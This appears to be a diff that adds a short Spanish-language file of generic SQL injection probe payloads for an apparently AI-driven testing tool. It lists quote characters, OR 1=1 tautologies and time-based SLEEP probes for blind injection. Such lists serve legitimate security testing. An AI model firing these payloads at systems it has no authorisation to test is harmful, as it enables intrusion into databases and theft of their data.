@@ -1,0 +1,15 @@
+# Payloads genéricos para sondeo de Inyección SQL
+# La IA seleccionará uno de estos para pruebas iniciales.
+
+# Clásico
+'
+"
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+
+# Basado en tiempo (para inferencia ciega)
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1; SELECT SLEEP(5)--
